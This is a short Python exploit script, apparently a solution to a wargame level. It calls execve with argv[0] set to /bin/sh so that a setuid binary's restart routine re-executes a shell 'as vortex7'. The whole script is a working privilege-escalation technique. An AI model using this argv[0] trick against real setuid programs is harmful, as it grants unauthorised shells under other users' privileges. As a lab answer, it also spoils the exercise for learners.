import ctypes, sys, os
prog = sys.argv[1].encode()
# argv[0] is what restart() re-execs: point it at /bin/sh so the setuid
# binary drops us into a shell as vortex7
argv = [b"/bin/sh"] + [None]
env = [b"PATH=/bin:/usr/bin", b"TERM=xterm"] + [None]
libc = ctypes.CDLL("libc.so.6")
ARGV = (ctypes.c_char_p * len(argv))(*argv)
ENVP = (ctypes.c_char_p * len(env))(*env)
libc.execve(prog, ARGV, ENVP)
print("execve failed", ctypes.get_errno())
